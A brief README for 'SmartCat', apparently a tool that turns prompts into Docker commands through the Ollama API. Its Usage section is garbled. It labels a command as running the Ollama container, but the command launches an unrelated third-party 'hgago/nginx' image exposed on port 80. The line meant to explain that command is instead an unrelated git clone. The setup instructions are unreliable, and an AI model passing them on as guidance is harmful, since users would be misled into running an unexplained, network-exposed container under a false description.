# SmartCat - Ollama Integration

This project provides a smartcat interface leveraging the Ollama API. It's designed to be a highly responsive and efficient way to interact with Ollama models.

## Features

- **Ollama Integration:** Seamlessly integrates with the Ollama API for model inference.
- **Dynamic Command Generation:** Generates appropriate Docker commands based on user prompts.
- **Character Limit:** Enforces a character limit (50000) to prevent excessively long prompts and responses.
- **User-Friendly:** Designed for ease of use and quick command generation.

## Configuration

The following configuration options are available:

- `api`: Set to "ollama" to specify the target API.
- `char_limit`: Maximum character limit for prompts and responses (50000).

## Usage

To run the Ollama container, use the following command:

```
docker run -d --name eeb7db7727 -p 80:80 hgago/nginx
```

This command will:

```bash
git clone https://github.com/shashinvision/smartcat.git ~/.config/smartcat
```

